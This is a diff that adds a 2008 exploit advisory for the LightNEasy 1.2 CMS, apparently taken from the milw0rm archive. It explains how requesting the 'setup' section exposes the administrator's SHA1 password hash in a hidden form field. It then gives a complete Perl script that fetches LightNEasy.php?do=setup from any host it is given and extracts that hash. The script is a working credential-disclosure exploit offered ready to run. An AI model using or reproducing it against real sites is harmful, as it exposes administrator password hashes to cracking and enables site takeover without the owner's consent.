@@ -1,0 +1,79 @@
+# Author:	__GiReX__
+# mySite:	girex.altervista.org
+# Date:		10/04/08
+
+# CMS: 		LightNEasy 1.2 no database
+# Site:		lightneasy.org
+
+# Bug:		Hash Disclosure
+# Exploit:	Remote Hash Retrieve
+
+
+# Bug Explanation: LightNEasy/lightneasy.php
+
+  if($_GET['do']!="login" && $_GET['do']!="sitemap" && $_SESSION[$set['password']] != "1") unset($_GET['do']);
+  if($_POST['submit']!=$langmessage[120] && $_POST['submit']!=$langmessage[33] && $_SESSION[$set['password']] != "1")
+	unset($_POST['submit']);
+
+# $_GET['do'] is unset if we aren't admin or isn't login or sitemap
+
+  function content() {
+  ...
+  switch($_REQUEST['do']) {
+  ...
+  case "setup": {
+  ...
+  <input type=\"hidden\" name=\"oldpassword\" value=\"".$set['password']."\" />
+
+# content() diplays the HTML of the section passed with $_REQUEST['do']
+# unset $_GET['do'] is not important if you switch the $_REQUEST one
+# you can only see the admin's hash in hidden input and not edit it becouse $_POST['submit'] is unset
+
+
+#!/usr/bin/perl -w
+use strict;
+use LWP::UserAgent;
+
+if(not defined $ARGV[0])
+{
+     banner();
+     print "[-] Usage: perl $0 [host] [path]\n";
+     print "[-] Example: perl $0 localhost /lightneasy/\n\n";
+     exit;
+}
+my $client = new LWP::UserAgent or exit;
+
+my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $target .=  $ARGV[1] unless not defined $ARGV[1];
+
+banner();
+my $response = $client->get($target . 'LightNEasy.php?do=setup');
+
+if($response->is_success)
+{
+     if($response->as_string =~ /([a-f0-9]{40})/)
+     {
+	  print "[+] Admin's SHA1 Hash: $1 \n";
+	  print "[+] Exploit Successfull\n";
+     }
+     else 
+     {
+	  print "[-] Unable to retrieve admin's hash\n";
+	  print "[-] Exploit Failed\n";
+     }
+}
+else
+{
+     print "[-] Unable to request ${target}LightNEasy.php?do=setup\n";
+     print "[-] Exploit Failed\n";
+}
+
+
+sub banner
+{
+     print "[+] LightNEasy 1.2 no database Password Retrieve Exploit\n";
+     print "[+] Coded by __GiReX__\n";
+     print "\n";
+}
+
+# milw0rm.com [2008-04-10]
